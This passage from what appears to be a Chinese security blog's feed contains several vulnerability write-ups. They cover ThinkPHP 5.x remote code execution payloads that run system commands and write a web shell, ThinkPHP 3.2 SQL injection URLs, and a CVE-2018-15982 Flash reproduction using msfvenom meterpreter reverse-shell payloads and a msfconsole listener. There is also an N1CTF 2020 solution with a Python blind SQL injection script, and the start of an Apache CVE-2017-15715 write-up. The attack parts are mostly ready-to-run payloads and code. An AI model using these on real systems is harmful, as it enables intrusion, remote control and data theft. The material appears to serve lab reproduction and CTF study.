phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p>这样就可以在根目录写入shell了</p><h3 id="5-0版本poc"><a href="#5-0版本poc" class="headerlink" title="5.0版本poc"></a>5.0版本poc</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">命令执行：?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=[系统命令]</span><br><span class="line">文件写入：?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][1]=&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>具体的利用就用上面的<code>poc</code>对应版本就可以打了，下面是5.1写shell文件的示例</p><img src="/2020/10/28/tp5-0-RCE/16.png" class=""><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>使用更高版本的<code>thinkphp</code>框架</p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;paper.seebug.org&#x2F;760&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;46ceb2c338bc?from&#x3D;groupmessage</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;tp5-0-amp-5-1远程RCE&quot;&gt;&lt;a href=&quot;#tp5-0-amp-5-1远程RCE&quot; class=&quot;headerlink&quot; title=&quot;tp5.0&amp;amp;5.1远程RCE&quot;&gt;&lt;/a&gt;tp5.0&amp;amp;5.1远程RCE
    
    </summary>
    
    
    
      <category term="tp" scheme="http://yoursite.com/tags/tp/"/>
    
  </entry>
  
  <entry>
    <title>tp3.2_find_select_delete_sql</title>
    <link href="http://yoursite.com/2020/10/27/tp3-2-find-select-delete-sql/"/>
    <id>http://yoursite.com/2020/10/27/tp3-2-find-select-delete-sql/</id>
    <published>2020-10-27T10:28:53.000Z</published>
    <updated>2020-10-28T03:07:43.192Z</updated>
    
    <content type="html"><![CDATA[<h2 id="tp历史版本漏洞"><a href="#tp历史版本漏洞" class="headerlink" title="tp历史版本漏洞"></a>tp历史版本漏洞<a id="more"></a></h2><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.thinkphp.cn&#x2F;download&#x2F;610.html</span><br><span class="line">下载解压缩放在phpstudy的www目录下</span><br></pre></td></tr></table></figure><p>配置数据库</p><p><code>thinkphp_3.2.3_full\Application\Common\Conf\config.php</code></p><img src="/2020/10/27/tp3-2-find-select-delete-sql/1.png" class=""><p>搭建测试数据库，表结构如图</p><img src="/2020/10/27/tp3-2-find-select-delete-sql/2.png" class=""><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>首先看到添加的方法<code>test()</code></p><img src="/2020/10/27/tp3-2-find-select-delete-sql/6.png" class=""><p>跟进获取id的方法<code>I</code>,这里进行了一次<code>htmlspecialchars</code>和<code>think_filter</code>过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">think_filter</span><span class="params">(&amp;$value)</span></span>&#123;</span><br><span class="line"><span class="comment">// TODO 其他安全过滤</span></span><br><span class="line"><span class="comment">// 过滤查询特殊字符</span></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i'</span>,$value))&#123;</span><br><span class="line">        $value .= <span class="string">' '</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到其实过滤的并不严格</p><p>接着就是跟进<code>find</code>方法</p><img src="/2020/10/27/tp3-2-find-select-delete-sql/7.png" class=""><p>可以看到在<code>find</code>方法中会进入<code>__parseOptions</code>方法，跟进一下</p><img src="/2020/10/27/tp3-2-find-select-delete-sql/8.png" class=""><p>这里可以看到<code>select</code>，后面的正常数据也未进行处理，导致注入</p><p>重点回到<code>__parseOptions</code>方法中的字段类型验证，如果<code>is_array($options[&#39;where&#39;])</code>这个条件满足，那么我们注入的<code>SQL</code>语句都会被<code>_parseType</code> 进行强转，如果是id[where]则导致不满足，产生注入</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><code>thinkphp_3.2.3_full\Application\Home\Controller\IndexController.class.php</code>添加一下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">       $id = i(<span class="string">'id'</span>);</span><br><span class="line">       $res = M(<span class="string">'user'</span>)-&gt;find($id);</span><br><span class="line">       <span class="comment">//$res = M('user')-&gt;delete($id);</span></span><br><span class="line">       <span class="comment">//$res = M('user')-&gt;select($id);</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>对于<code>select()</code>和<code>find()</code>方法，有较多可注入点，可以追踪<code>parseSql</code>来进行查看</p><img src="/2020/10/27/tp3-2-find-select-delete-sql/3.png" class=""><p>下面的exp是<code>table、alias、where</code>的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">table:m=Home&amp;c=Index&amp;a=test&amp;id[table]=user where%<span class="number">201</span>%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,user(),<span class="number">0x7e</span>),<span class="number">1</span>)--</span><br><span class="line">alias:m=Home&amp;c=Index&amp;a=test&amp;id[alias]=where%<span class="number">201</span>%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,user(),<span class="number">0x7e</span>),<span class="number">1</span>)--</span><br><span class="line">where:m=Home&amp;c=Index&amp;a=test&amp;id[where]=<span class="number">1</span>%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,user(),<span class="number">0x7e</span>),<span class="number">1</span>)--</span><br></pre></td></tr></table></figure><img src="/2020/10/27/tp3-2-find-select-delete-sql/4.png" class=""><p>对于<code>delete,</code>,<code>table,alias,where，在使用table和alias的时候，同时还必须保证where不为空</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">where: http:<span class="comment">//127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--</span></span><br><span class="line"></span><br><span class="line">alias: http:<span class="comment">//127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--</span></span><br><span class="line"></span><br><span class="line">table: http:<span class="comment">//127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[table]=user%20where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--&amp;id[where]=1</span></span><br></pre></td></tr></table></figure><img src="/2020/10/27/tp3-2-find-select-delete-sql/5.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;tp历史版本漏洞&quot;&gt;&lt;a href=&quot;#tp历史版本漏洞&quot; class=&quot;headerlink&quot; title=&quot;tp历史版本漏洞&quot;&gt;&lt;/a&gt;tp历史版本漏洞
    
    </summary>
    
    
    
      <category term="tp" scheme="http://yoursite.com/tags/tp/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2018-15982</title>
    <link href="http://yoursite.com/2020/10/23/CVE-2018-15982/"/>
    <id>http://yoursite.com/2020/10/23/CVE-2018-15982/</id>
    <published>2020-10-23T09:44:46.000Z</published>
    <updated>2020-12-08T11:53:03.918Z</updated>
    
    <content type="html"><![CDATA[<h2 id="adobe-flasher远程命令执行漏洞"><a href="#adobe-flasher远程命令执行漏洞" class="headerlink" title="adobe flasher远程命令执行漏洞"></a>adobe flasher远程命令执行漏洞<a id="more"></a></h2><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>2018年11月29日，某团队在全球范围内第一时间发现一起针对俄罗斯的APT攻击行动，通过一份俄文内容的医院员工问卷文档，携带最新的Flash <code>0day</code>漏洞和具有自毁功能的专属木马程序，该漏洞允许攻击者恶意制作的Flash对象在受害者的计算机上执行代码，从而获取对系统命令行的访问权限。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p><code>AdobeFlash Player &lt;= 31.0.0.153</code></p><p><code>AdobeFlash Player Installer&lt;= 31.0.0.108</code></p><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">攻击机:Linux kali</span><br><span class="line">靶机:搭载adobeFlash29的windows7 x64</span><br></pre></td></tr></table></figure><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">获取CVE网上公开的poc</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;Ridter&#x2F;CVE-2018-15982_EXP</span><br></pre></td></tr></table></figure><p>根据网上公开的payload，创建payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 RC4PASSWORD=123 LHOST=172.22.236.233 LPORT=4444 -f raw&gt;86.bin</span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 RC4PASSWORD=123 LHOST=172.22.236.233 LPORT=4444 -f raw&gt;64.bin</span><br></pre></td></tr></table></figure><p>这会生成对应的两个对应的<code>bin</code>可执行文件，但是在后续发现payload有问题，并且公开文章中反弹shell的截图都比较，emm，所以只有自己测试。经过不断测试，修改了payload，下面的payload是得到shell的,也就是生成<code>meterpreter</code>反弹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 LHOST=172.22.236.233 LPORT=4444 -f raw&gt;86.bin</span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 LHOST=172.22.236.233 LPORT=4444 -f raw&gt;64.bin</span><br></pre></td></tr></table></figure><img src="/2020/10/23/CVE-2018-15982/1.png" class=""><p>得到<code>bin</code>文件之后，调用<code>poc</code>脚本生成对应的文件</p><p>在调用之后将生成的文件移到web服务路径下</p><img src="/2020/10/23/CVE-2018-15982/2.png" class=""><p>开启web服务，访问一下本地服务</p><img src="/2020/10/23/CVE-2018-15982/3.png" class=""><p>可以成功访问到刚刚生成的<code>index.html</code>文件，下面开启监听，这里接触到一个之前并不了解的工具，<code>msfconsole</code>控制台</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">拓展：</span><br><span class="line">Msfconsole提供了一个一体化的集中控制台。通过msfconsole，你可以访问和使用所有的metasploit的插件，payload，利用模块，post模块等等。Msfconsole还有第三方程序的接口，比如nmap，sqlmap等，可以直接在msfconsole里面使用。</span><br><span class="line">具体的可以看看这篇文章</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;xianjie0318&#x2F;article&#x2F;details&#x2F;81482209https:&#x2F;&#x2F;blog.csdn.net&#x2F;xianjie0318&#x2F;article&#x2F;details&#x2F;81482209</span><br></pre></td></tr></table></figure><p>下面启用<code>msfconsole</code>控制台之后进行payload等设置进行监听，<code>linux</code>终端挨个调用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp_rc4</span><br><span class="line">set lport 4444</span><br><span class="line">set lhost ip</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><img src="/2020/10/23/CVE-2018-15982/4.png" class=""><p>在靶机中用IE浏览器访问攻击机的<code>ip</code>地址，成功弹回shell</p><img src="/2020/10/23/CVE-2018-15982/5.png" class=""><p>下面可以看一下靶机的相关信息，像是拥有者，桌面文件</p><img src="/2020/10/23/CVE-2018-15982/6.png" class=""><p><code>GITHUB</code>上给的payload弹的是一个本地的计算器，这里直接进行尝试，切换到shell下</p><img src="/2020/10/23/CVE-2018-15982/7.png" class=""><img src="/2020/10/23/CVE-2018-15982/8.png" class=""><p>还可以往其他硬盘中写入文件，在D盘根目录下写入<code>peguin.txt</code>，写点东西进去</p><img src="/2020/10/23/CVE-2018-15982/9.png" class=""><img src="/2020/10/23/CVE-2018-15982/10.png" class=""><h2 id="复现总结"><a href="#复现总结" class="headerlink" title="复现总结"></a>复现总结</h2><p>这次复现过程比较曲折，adobe由于即将下线关于历史版本的下载页面已经下线，找到符合复现环境的adobe版本就花了挺长时间。其次公开的payload文章给的payload不能直接利用，开始没有想到修改payload，还是自己的原因</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>Adobe官方已经发布新版本修复了上述漏洞，用户应及时升级进行防护。</p><p>下载更新地址：<a href="https://get.adobe.com/flashplayer" target="_blank" rel="noopener">https://get.adobe.com/flashplayer</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">参考链接</span><br><span class="line">https:&#x2F;&#x2F;www.freebuf.com&#x2F;column&#x2F;197760.html</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;xuandao_ahfengren&#x2F;article&#x2F;details&#x2F;86532740</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;adobe-flasher远程命令执行漏洞&quot;&gt;&lt;a href=&quot;#adobe-flasher远程命令执行漏洞&quot; class=&quot;headerlink&quot; title=&quot;adobe flasher远程命令执行漏洞&quot;&gt;&lt;/a&gt;adobe flasher远程命令执行漏洞
    
    </summary>
    
    
    
      <category term="CVE" scheme="http://yoursite.com/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>n1ctf2020</title>
    <link href="http://yoursite.com/2020/10/20/n1ctf2020/"/>
    <id>http://yoursite.com/2020/10/20/n1ctf2020/</id>
    <published>2020-10-20T12:02:37.000Z</published>
    <updated>2020-10-21T05:15:47.019Z</updated>
    
    <content type="html"><![CDATA[<p>这次比赛难度挺大的，也有收获，继续加油<a id="more"></a></p><h2 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul><li>盲注</li><li>序列化</li></ul><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ip</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $ip;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($info)</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ip = <span class="keyword">$this</span>-&gt;waf($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ip =$_SERVER[<span class="string">"REMOTE_ADDR"</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $con=mysqli_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"********"</span>,<span class="string">"n1ctf_websign"</span>);</span><br><span class="line">        $sqlquery=sprintf(<span class="string">"INSERT into n1ip(`ip`,`time`) VALUES ('%s','%s')"</span>,<span class="keyword">$this</span>-&gt;waf($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]),time());</span><br><span class="line">        <span class="keyword">if</span>(!mysqli_query($con,$sqlquery))&#123;</span><br><span class="line">            <span class="keyword">return</span> mysqli_error($con);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"your ip looks ok!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        mysqli_close($con);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $ip;</span><br><span class="line">    <span class="keyword">public</span> $check;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($ip)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ip = $ip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(md5(<span class="keyword">$this</span>-&gt;check)===md5(<span class="string">"key****************"</span>))&#123;</span><br><span class="line">    readfile(<span class="string">'/flag'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;ip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(stristr(<span class="keyword">$this</span>-&gt;ip, <span class="string">"n1ctf"</span>)!==<span class="keyword">False</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ip = <span class="string">"welcome to n1ctf2020"</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;ip = <span class="string">"noip"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;getflag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'input'</span>]))&#123;</span><br><span class="line">    $input = $_GET[<span class="string">'input'</span>];</span><br><span class="line">unserialize($input);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>拿到代码的时候以为考的是序列化，但是在尝试过程中发现不是</p><p>开始的时候方向错了，按照习惯<code>new</code>了一个<code>flag</code>类，绕过<code>__wakeup()</code>魔术方法，后来和队内师傅交流才发现如果绕过了就拿不到回显，要改一下方向</p><p>这里注意到第一个类里存在<code>mysqli_error($con)</code>,结合拿到flag的条件，应该要注出数据库中的<code>key</code></p><p>这里不能绕过<code>__wakeup()</code>，根据数据中有无<code>n1ctf</code>来进行判断，根据回显的不同作为条件</p><p>上面的<code>sql</code>部分查到了一个题，用的是报错注入，这里也就用报错注入</p><p>这里开始想的是<code>updatexml</code>优先级太高，没有想到把<code>if</code>放到里面，队里师傅提醒，也就有了思路</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://101.32.205.189/index.php?input=O:4:"flag":2:&#123;s:2:"ip";O:2:"ip":1:&#123;s:2:"ip";i:1;&#125;s:5:"check";s:4:"test";&#125;'</span></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line">req = requests.session()</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> high &gt; low:</span><br><span class="line">        payload = <span class="string">"1',updatexml(1,if(ascii(substr((select group_concat(b) from (select 1,2 as b union select * from n1key)a),&#123;&#125;,1))&gt;&#123;&#125;,1,concat(0x282b,('n1ctf'),0x292b)),1)),('1"</span>.format(</span><br><span class="line">            x, mid)</span><br><span class="line">        <span class="comment">#table:n1ip,n1key</span></span><br><span class="line">        <span class="comment">#n1ip:id,ip,time ip</span></span><br><span class="line">        <span class="comment">#n1key:id,key</span></span><br><span class="line">        <span class="comment">#2,n1ctf20205bf75ab0a30dfc0c</span></span><br><span class="line">        data = &#123;<span class="string">"X-Forwarded-For"</span>: payload&#125;</span><br><span class="line">        resp = requests.get(url, headers=data)  <span class="comment">#GET:params=data POST:data=data</span></span><br><span class="line">        print(resp.url)</span><br><span class="line">        <span class="comment"># print(resp.text)</span></span><br><span class="line">        <span class="keyword">if</span> resp.text.count(<span class="string">'noip'</span>) == <span class="number">2</span>:  <span class="comment">#</span></span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="comment"># print(mid)</span></span><br><span class="line">    result += chr(int(mid))</span><br><span class="line">    print(result)</span><br><span class="line">    <span class="comment"># print(len(result))</span></span><br><span class="line">print(<span class="string">"end......."</span>)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><p>这是用无列名盲注注出的key，前面查表数据库等用union联合盲注就可以了</p><p>(赛后发现key是sql数据库的关键词，用反引号包裹就能注出数据，比赛没想到，拉跨了…)</p><img src="/2020/10/20/n1ctf2020/1.png" class=""><p>这里用无列名是因为列是存在数据的，但是带不出来</p><p>下面就是序列化数据传入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ip</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $ip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">flag</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $ip;</span><br><span class="line">        <span class="keyword">public</span> $check;</span><br><span class="line">    &#125;</span><br><span class="line">    $a = <span class="keyword">new</span> flag();</span><br><span class="line">    $a-&gt;ip = <span class="keyword">new</span> ip();</span><br><span class="line">    $a-&gt;check = <span class="string">'n1ctf20205bf75ab0a30dfc0c'</span>;</span><br><span class="line">    $a-&gt;ip-&gt;ip = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">    <span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">//O:4:"flag":2:&#123;s:2:"ip";O:2:"ip":1:&#123;s:2:"ip";s:9:"127.0.0.1";&#125;s:5:"check";s:25:"n1ctf20205bf75ab0a30dfc0c";&#125;（注：不用new ip类也可以，比赛时懒得改了）</span></span><br></pre></td></tr></table></figure><p>传过去就能拿到flag了</p><img src="/2020/10/20/n1ctf2020/2.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这次比赛难度挺大的，也有收获，继续加油
    
    </summary>
    
    
    
      <category term="n1ctf" scheme="http://yoursite.com/tags/n1ctf/"/>
    
  </entry>
  
  <entry>
    <title>ApacheHTTPD换行解析漏洞CVE-2017-15715</title>
    <link href="http://yoursite.com/2020/10/14/ApacheHTTPD%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9ECVE-2017-15715/"/>
    <id>http://yoursite.com/2020/10/14/ApacheHTTPD%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9ECVE-2017-15715/</id>
    <published>2020-10-14T11:50:26.000Z</published>
    <updated>2020-10-23T10:06:20.751Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞概要"><a href="#漏洞概要" class="headerlink" title="漏洞概要"></a>漏洞概要<a id="more"></a></h2><p>Apache HTTPD<code>是一款HTTP服务器，它可以通过</code>mod_php<code>来运行</code>PHP<code>网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析</code>PHP<code>时，</code>1.php\x0a<code>将被按照</code>PHP`后缀进行解析，导致绕过一些服务器的安全策略。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><code>&lt;FilesMatch&gt;</code>中指定的表达式可以将’$’匹配到恶意文件名中的换行符，而不是仅匹配文件名的末尾。可以在外部阻止某些文件的上载但仅通过匹配文件名尾部的环境中利用此功能。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache httpd 2.4.0-2.4.29</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">装有docker的centos</span><br><span class="line">环境搭建</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub</span><br><span class="line">cd &#x2F;vulhub&#x2F;CVE-2018-15715</span><br><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>这个<code>github</code>上拉下来的<code>index.php</code>中已经补全了上传的html代码，先来看一下重点部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 